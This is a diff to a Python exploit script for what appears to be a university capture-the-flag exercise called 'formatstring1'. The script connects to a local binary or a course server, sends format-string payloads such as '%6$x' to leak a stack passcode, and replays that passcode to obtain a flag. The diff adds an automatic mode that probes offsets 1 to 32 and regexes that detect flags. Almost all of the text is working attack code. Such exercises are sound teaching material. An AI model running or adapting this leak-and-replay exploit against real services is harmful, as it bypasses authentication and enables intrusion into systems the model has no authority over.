@@ -12,9 +12,12 @@ This script automates the exact manual attack:
 from __future__ import annotations
 
 import argparse
+import os
 import re
+import select
 import socket
 import subprocess
+import time
 from pathlib import Path
 from typing import Optional
 
@@ -24,28 +27,57 @@ FORMATSTRING_DIR = SCRIPT_DIR.parent / "formatstring1"
 DEFAULT_BINARY = str(FORMATSTRING_DIR / "random-game")
 DEFAULT_HOST = "moa6.eecs.utk.edu"
 DEFAULT_PORT = 32100
-DEFAULT_LEAK_FORMAT = "%6$x"
-DEFAULT_FIRST_PROMPT = "passcode to enter here?"
-DEFAULT_SECOND_PROMPT = "Again! What's the passcode to enter here?"
+DEFAULT_LEAK_FORMAT = "auto"
 
 HEX_RE = re.compile(r"0x[0-9a-fA-F]+|\b[0-9a-fA-F]{4,}\b")
+FLAG_RE = re.compile(r"cosc[0-9-]*-flag-\{[^}]+\}", re.IGNORECASE)
+GENERIC_FLAG_RE = re.compile(r"\b[a-z][a-z0-9_-]{1,32}\{[^}\n]{4,128}\}", re.IGNORECASE)
+READY_TIMEOUT = 4.0
+IDLE_TIMEOUT = 0.25
 
 
-def recv_until(sock: socket.socket, marker: bytes, timeout: float = 5.0) -> bytes:
-    """Read bytes until marker appears (or raise TimeoutError)."""
-    sock.settimeout(timeout)
-    data = b""
-
-    while marker not in data:
-        chunk = sock.recv(4096)
+def _read_local_idle(
+    proc: subprocess.Popen[bytes], timeout: float = READY_TIMEOUT
+) -> str:
+    if proc.stdout is None:
+        raise RuntimeError("Failed to open subprocess stdout")
+    out = b""
+    fd = proc.stdout.fileno()
+    deadline = time.monotonic() + timeout
+    while True:
+        remaining = deadline - time.monotonic()
+        if remaining <= 0:
+            break
+        ready, _, _ = select.select([fd], [], [], min(IDLE_TIMEOUT, remaining))
+        if not ready:
+            if out:
+                break
+            continue
+        chunk = os.read(fd, 4096)
         if not chunk:
             break
-        data += chunk
+        out += chunk
+    return out.decode(errors="replace")
 
-    if marker not in data:
-        raise TimeoutError(f"Did not receive marker: {marker!r}")
 
-    return data
+def _read_remote_idle(sock: socket.socket, timeout: float = READY_TIMEOUT) -> str:
+    out = b""
+    deadline = time.monotonic() + timeout
+    while True:
+        remaining = deadline - time.monotonic()
+        if remaining <= 0:
+            break
+        sock.settimeout(min(IDLE_TIMEOUT, remaining))
+        try:
+            chunk = sock.recv(4096)
+        except socket.timeout:
+            if out:
+                break
+            continue
+        if not chunk:
+            break
+        out += chunk
+    return out.decode(errors="replace")
 
 
 def first_nonempty_line(text: str) -> Optional[str]:
@@ -72,118 +104,117 @@ def build_leak_payload(leak_format: str) -> bytes:
     return leak_format.encode()
 
 
-def run_local(
-    binary: str, leak_format: str, first_prompt: str, second_prompt: str
-) -> None:
+def looks_like_success(text: str) -> bool:
+    return bool(FLAG_RE.search(text) or GENERIC_FLAG_RE.search(text))
+
+
+def _run_local_once(binary: str, leak_format: str) -> str:
     proc = subprocess.Popen(
         [binary],
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE,
         stderr=subprocess.STDOUT,
-        text=True,
-        bufsize=0,
         cwd=str(FORMATSTRING_DIR),
     )
 
     if proc.stdin is None or proc.stdout is None:
         raise RuntimeError("Failed to open subprocess pipes")
 
-    banner_and_prompt = ""
-    while first_prompt not in banner_and_prompt:
-        ch = proc.stdout.read(1)
-        if ch == "":
-            break
-        banner_and_prompt += ch
-
-    print(banner_and_prompt, end="")
-    proc.stdin.write(build_leak_payload(leak_format).decode())
+    banner = _read_local_idle(proc)
+    proc.stdin.write(build_leak_payload(leak_format))
     proc.stdin.flush()
+    stage_two = _read_local_idle(proc)
 
-    leak_and_second_prompt = ""
-    while second_prompt not in leak_and_second_prompt:
-        ch = proc.stdout.read(1)
-        if ch == "":
-            break
-        leak_and_second_prompt += ch
-
-    print(leak_and_second_prompt, end="")
-    leaked = first_hex_token(leak_and_second_prompt) or first_nonempty_line(
-        leak_and_second_prompt
-    )
+    leaked = first_hex_token(stage_two) or first_nonempty_line(stage_two)
     if leaked is None:
         raise RuntimeError("Failed to parse leaked passcode from local output")
 
-    proc.stdin.write(leaked + "\n")
+    proc.stdin.write((leaked + "\n").encode())
     proc.stdin.flush()
+    proc.stdin.close()
 
-    rest = proc.stdout.read()
-    if rest:
-        print(rest, end="")
+    rest = proc.stdout.read().decode(errors="replace") if proc.stdout else ""
+    try:
+        proc.wait(timeout=2)
+    except subprocess.TimeoutExpired:
+        proc.kill()
 
-    proc.wait(timeout=3)
+    return banner + stage_two + rest
 
 
-def run_remote(
-    host: str, port: int, leak_format: str, first_prompt: str, second_prompt: str
-) -> None:
+def run_local(binary: str, leak_format: str) -> None:
+    if leak_format != "auto":
+        print(_run_local_once(binary, leak_format), end="")
+        return
+
+    for idx in range(1, 33):
+        candidate = f"%{idx}$x"
+        output = _run_local_once(binary, candidate)
+        print(f"[*] try leak-format={candidate}")
+        if looks_like_success(output):
+            print(output, end="")
+            return
+    raise RuntimeError("auto mode failed to find working leak offset")
+
+
+def _run_remote_once(host: str, port: int, leak_format: str) -> str:
     with socket.create_connection((host, port), timeout=5.0) as sock:
-        # 1) Wait until the first passcode prompt appears.
-        banner_and_prompt = recv_until(sock, first_prompt.encode())
-        print(banner_and_prompt.decode(errors="replace"))
-
-        # 2) Send format-string payload to leak stack value.
+        banner = _read_remote_idle(sock)
         sock.sendall(build_leak_payload(leak_format))
-
-        # 3) Read until second prompt. The leak appears before it.
-        leak_and_second_prompt = recv_until(sock, second_prompt.encode())
-        leak_text = leak_and_second_prompt.decode(errors="replace")
-        print(leak_text)
-
-        # Grab first non-empty line as the leaked hex passcode.
-        leaked = first_hex_token(leak_text) or first_nonempty_line(leak_text)
+        stage_two = _read_remote_idle(sock)
+        leaked = first_hex_token(stage_two) or first_nonempty_line(stage_two)
         if leaked is None:
             raise RuntimeError("Failed to parse leaked passcode from server response")
 
-        # 4) Send leaked hex value back to satisfy scanf("%x", &yourcode).
         sock.sendall((leaked + "\n").encode())
+        tail = _read_remote_idle(sock, timeout=5.0)
+        return banner + stage_two + tail
 
-        # 5) Read remaining output (should include success + flag).
-        sock.settimeout(2.0)
-        tail = b""
-        try:
-            while True:
-                chunk = sock.recv(4096)
-                if not chunk:
-                    break
-                tail += chunk
-        except TimeoutError:
-            # Timeout just means server stopped sending quickly; print what we have.
-            pass
 
-        print(tail.decode(errors="replace"))
+def run_remote(host: str, port: int, leak_format: str) -> None:
+    if leak_format != "auto":
+        print(_run_remote_once(host, port, leak_format), end="")
+        return
+
+    for idx in range(1, 33):
+        candidate = f"%{idx}$x"
+        output = _run_remote_once(host, port, candidate)
+        print(f"[*] try leak-format={candidate}")
+        if looks_like_success(output):
+            print(output, end="")
+            return
+    raise RuntimeError("auto mode failed to find working leak offset")
 
 
 def main() -> None:
     parser = argparse.ArgumentParser(description="formatstring1 helper")
-    parser.add_argument("--mode", choices=["local", "remote"], default="remote")
+    parser.add_argument(
+        "--mode",
+        choices=["local", "remote"],
+        default="local",
+        help="target mode (default: local)",
+    )
     parser.add_argument("--binary", default=DEFAULT_BINARY)
-    parser.add_argument("--host", default=DEFAULT_HOST)
-    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
-    parser.add_argument("--leak-format", default=DEFAULT_LEAK_FORMAT)
-    parser.add_argument("--first-prompt", default=DEFAULT_FIRST_PROMPT)
-    parser.add_argument("--second-prompt", default=DEFAULT_SECOND_PROMPT)
+    parser.add_argument(
+        "--host", default=DEFAULT_HOST, help="remote host (used when --mode remote)"
+    )
+    parser.add_argument(
+        "--port",
+        type=int,
+        default=DEFAULT_PORT,
+        help="remote port (used when --mode remote)",
+    )
+    parser.add_argument(
+        "--leak-format",
+        default=DEFAULT_LEAK_FORMAT,
+        help="leak format (default: auto, probes %%1$x..%%32$x)",
+    )
     args = parser.parse_args()
 
     if args.mode == "local":
-        run_local(args.binary, args.leak_format, args.first_prompt, args.second_prompt)
+        run_local(args.binary, args.leak_format)
     else:
-        run_remote(
-            args.host,
-            args.port,
-            args.leak_format,
-            args.first_prompt,
-            args.second_prompt,
-        )
+        run_remote(args.host, args.port, args.leak_format)
 
 
 if __name__ == "__main__":
